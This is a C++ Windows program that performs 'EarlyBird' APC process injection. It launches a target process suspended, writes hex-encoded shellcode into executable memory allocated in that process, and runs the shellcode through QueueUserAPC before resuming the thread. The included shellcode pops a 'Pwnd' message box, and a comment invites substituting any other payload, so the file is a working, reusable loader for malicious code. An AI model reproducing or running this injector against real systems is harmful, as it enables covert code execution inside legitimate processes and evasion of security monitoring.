#include <iostream>
#include <windows.h>

// Spawns a MessageBox
char shellcode[] = \
"\x31\xc9\xf7\xe1\x64\x8b\x41\x30\x8b\x40"
"\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10"
"\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda"
"\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01"
"\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81"
"\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78"
"\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24"
"\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c"
"\x01\xde\x8b\x14\x8e\x01\xda\x89\xd5\x31"
"\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69"
"\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff"
"\xd2\x68\x6c\x6c\x61\x61\x66\x81\x6c\x24"
"\x02\x61\x61\x68\x33\x32\x2e\x64\x68\x55"
"\x73\x65\x72\x54\xff\xd0\x68\x6f\x78\x41"
"\x61\x66\x83\x6c\x24\x03\x61\x68\x61\x67"
"\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff"
"\xd5\x83\xc4\x10\x31\xd2\x31\xc9\x52\x68"
"\x50\x77\x6e\x64\x89\xe7\x52\x68\x59\x65"
"\x73\x73\x89\xe1\x52\x57\x51\x52\xff\xd0"
"\x83\xc4\x10\x68\x65\x73\x73\x61\x66\x83"
"\x6c\x24\x03\x61\x68\x50\x72\x6f\x63\x68"
"\x45\x78\x69\x74\x54\x53\xff\xd5\x31\xc9"
"\x51\xff\xd0";

int main(int argc, char **argv) {
    if (argc < 2) {
        std::cout << "USAGE: " << argv[0] << " <path\\to\\process>" << std::endl;
        return 1;
    }
    
    // Change shellcode here, or modify the program to accept payload from argv
    //char shellcode[] = {'\xCC', '\xCC', '\xCC', '\xCC'};

    STARTUPINFOA startupInfo = {sizeof(STARTUPINFOA)};
    PROCESS_INFORMATION procInfo;

    // Creating the target process, passed by argv[1]
    std::cout << "[+] Creating process " << argv[1] << "..." << std::endl;
    BOOL status = CreateProcessA(argv[1], NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &procInfo);
    if (!status) {
        std::cerr << "Error on CreateProcess: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "   \\_ [+] PID: " << procInfo.dwProcessId << std::endl;

    std::cout << "[+] Allocating memory in remote process..." << std::endl;
    LPVOID shellcodeRemoteLocation = VirtualAllocEx(procInfo.hProcess, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!shellcodeRemoteLocation) {
        std::cerr << "Error on VirtualAllocEx: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "   \\_ [+] Allocated " << sizeof(shellcode) << " bytes at region " << std::hex << " 0x" << shellcodeRemoteLocation << std::endl;

    std::cout << "[+] Trying to write shellcode at allocated memory..." << std::endl;
    DWORD numberOfBytesWritten = 0;
    status = WriteProcessMemory(procInfo.hProcess, shellcodeRemoteLocation, shellcode, sizeof(shellcode), &numberOfBytesWritten);
    if (!status) {
        std::cerr << "Error on WriteProcessMemory: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "   \\_ [+] Shellcode wrote successfully" << std::endl;

    std::cout << "[+] Attempting to call shellcode via QueueUserAPC..." << std::endl;
    QueueUserAPC((PAPCFUNC)shellcodeRemoteLocation, procInfo.hThread, NULL);
    ResumeThread(procInfo.hThread);
    std::cout << "   \\_ [+] Success" << std::endl;

    std::cout << "[+] EarlyBird injection successful :)" << std::endl;

    //CloseHandle(procInfo.hProcess);
}